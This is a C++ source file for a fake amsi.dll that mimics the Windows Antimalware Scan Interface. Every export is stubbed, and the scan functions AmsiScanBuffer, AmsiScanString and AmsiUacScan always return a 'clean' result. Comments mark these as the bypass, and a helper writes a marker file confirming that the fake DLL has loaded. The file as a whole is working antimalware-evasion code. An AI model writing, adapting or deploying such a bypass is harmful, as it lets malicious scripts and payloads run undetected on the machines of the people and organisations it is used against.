#include <windows.h>
#include "pch.h"
#include <cstdio>

typedef void* HAMSICONTEXT;
typedef void* HAMSISESSION;

typedef enum _AMSI_RESULT {
    AMSI_RESULT_CLEAN = 0,      // CLEAN = bypass
    AMSI_RESULT_NOT_DETECTED = 1,
    AMSI_RESULT_BLOCKED_BY_ADMIN_START = 16384,
    AMSI_RESULT_BLOCKED_BY_ADMIN_END = 20479,
    AMSI_RESULT_DETECTED = 32768   // DETECTED = Normally, this is the output that comes up in malware.
} AMSI_RESULT;

extern "C" __declspec(dllexport) HRESULT WINAPI AmsiInitialize(    
    LPCWSTR appName,
    HAMSICONTEXT* amsiContext)
{
    if (amsiContext) *amsiContext = (HAMSICONTEXT)1;
    return S_OK;
}

extern "C" __declspec(dllexport) HRESULT WINAPI AmsiUninitialize(
    HAMSICONTEXT amsiContext)
{
    return S_OK;
}

extern "C" __declspec(dllexport) HRESULT WINAPI AmsiOpenSession(
    HAMSICONTEXT amsiContext,
    HAMSISESSION* amsiSession)
{
    if (amsiSession) *amsiSession = (HAMSISESSION)1;
    return S_OK;
}

extern "C" __declspec(dllexport) HRESULT WINAPI AmsiCloseSession(
    HAMSICONTEXT amsiContext,
    HAMSISESSION amsiSession)
{
    return S_OK;
}

//BYPASS
extern "C" __declspec(dllexport) HRESULT WINAPI AmsiScanBuffer(
    HAMSICONTEXT amsiContext,
    PVOID buffer,
    ULONG length,
    LPCWSTR contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT* result)
{
    if (result) *result = AMSI_RESULT_CLEAN;
    return S_OK;
}

extern "C" __declspec(dllexport) HRESULT WINAPI AmsiScanString(
    HAMSICONTEXT amsiContext,
    LPCWSTR string,
    LPCWSTR contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT* result)
{
    if (result) *result = AMSI_RESULT_CLEAN;
    return S_OK;
}

extern "C" __declspec(dllexport) HRESULT WINAPI AmsiUacInitialize(
    HAMSICONTEXT* amsiContext)
{
    if (amsiContext) *amsiContext = (HAMSICONTEXT)1;
    return S_OK;
}

extern "C" __declspec(dllexport) HRESULT WINAPI AmsiUacScan(
    HAMSICONTEXT amsiContext,
    PVOID buffer,
    ULONG length,
    AMSI_RESULT* result)
{
    if (result) *result = AMSI_RESULT_CLEAN;
    return S_OK;
}

extern "C" __declspec(dllexport) HRESULT WINAPI AmsiUacUninitialize(
    HAMSICONTEXT amsiContext)
{
    return S_OK;
}

extern "C" __declspec(dllexport) HRESULT WINAPI DllCanUnloadNow(void)
{
    return S_FALSE;
}

extern "C" __declspec(dllexport) HRESULT WINAPI DllGetClassObject(
    REFCLSID rclsid,
    REFIID riid,
    LPVOID* ppv)
{
    *ppv = NULL;
    return CLASS_E_CLASSNOTAVAILABLE;
}

extern "C" __declspec(dllexport) HRESULT WINAPI DllRegisterServer(void)
{
    return S_OK;
}

extern "C" __declspec(dllexport) HRESULT WINAPI DllUnregisterServer(void)
{
    return S_OK;
}

void WriteFakeAmsiLog()
{
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);           // exe'nin yolunu al
    char* lastSlash = strrchr(path, '\\');
    if (lastSlash) *lastSlash = 0;

    char logPath[MAX_PATH];
    sprintf_s(logPath, "%s\\FAKE_AMSI_LOADED.txt", path);

    FILE* f = NULL;
    fopen_s(&f, logPath, "w");
    if (f) {
        fprintf(f, "========================================\n");
        fprintf(f, "   FAKE AMSI SUCCESSFULLY LOADED\n");
        fprintf(f, "   Timestamp: %s\n", __TIMESTAMP__);
        fprintf(f, "   Process: %s\n", path);
        fprintf(f, "========================================\n");
        fclose(f);
    }

}